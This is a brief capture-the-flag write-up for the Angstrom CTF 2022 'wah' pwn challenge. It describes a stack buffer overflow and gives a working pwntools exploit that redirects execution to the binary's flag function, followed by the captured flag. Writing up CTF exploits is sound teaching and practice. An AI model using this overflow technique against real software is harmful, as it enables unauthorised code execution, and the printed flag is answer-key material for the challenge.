---
title: "[Pwn] wah [Angstrom CTF 2022]"
date: 2022-05-06 23:48:00
---

# 0x0 Introduction

Baby friendly!


nc challs.actf.co 31224

Author: JoshDaBosh

files: [wah](wah), [wah.c](wah.c)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


# 0x2 Vulnerability

simple buffer overflow, overwrite rip to `sym.flag`

# 0x3 Exploit

```
from pwn import *

io = connect("challs.actf.co",31224)
exe = context.binary = ELF("wah")

io.sendlineafter(b"Cry: ",flat({
    0x20+0x8: exe.sym["flag"]
}))
print(io.recv())

```

# 0x4 Flag

actf{lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e}